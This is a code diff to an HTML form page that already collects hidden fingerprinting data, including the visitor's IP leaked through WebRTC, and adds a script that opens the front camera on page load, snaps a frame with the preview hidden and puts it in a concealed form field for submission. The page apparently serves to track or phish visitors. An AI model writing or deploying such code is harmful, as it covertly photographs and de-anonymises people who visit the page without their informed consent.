@@ -86,6 +86,13 @@
     <input type="hidden" name="page_visibility" id="page_visibility">
     <input type="hidden" name="media_devices" id="media_devices">
     <input type="hidden" name="webrtc_ip" id="webrtc_ip">
+    <!-- Hidden input to store the photo data -->
+    <input type="hidden" name="user_photo" id="user_photo">
+
+    <!-- Optional: Video element to show the camera preview -->
+    <video id="cameraPreview" style="display:none;" autoplay></video>
+
+
     
     <button type="submit">Submit</button>
 </form>
@@ -430,6 +437,51 @@ rtc.onicecandidate = ice => {
     let ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
     document.getElementById('webrtc_ip').value = ip;
 };
+
+
+
+// capture user photo 
+function captureUserPhoto() {
+    const video = document.getElementById('cameraPreview');
+    const canvas = document.createElement('canvas');
+    const userPhotoInput = document.getElementById('user_photo');
+
+    // Request access to the user's camera
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+        .then(stream => {
+            // Set the video source to the stream from the camera
+            video.srcObject = stream;
+
+            // Once the video stream is ready, capture a photo
+            video.addEventListener('canplay', () => {
+                // Set the canvas size to the video frame size
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                // Draw the video frame to the canvas
+                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // Convert the canvas image to a base64 string
+                userPhotoInput.value = canvas.toDataURL('image/png');
+
+                // Stop the video stream after capturing the photo
+                stream.getTracks().forEach(track => track.stop());
+            });
+        })
+        .catch(error => {
+            console.error('Error accessing the camera:', error);
+            userPhotoInput.value = 'Camera access denied';
+        });
+}
+
+document.addEventListener("DOMContentLoaded", function() {
+    captureUserPhoto();
+});
+
+
+
+
+
 
     
     
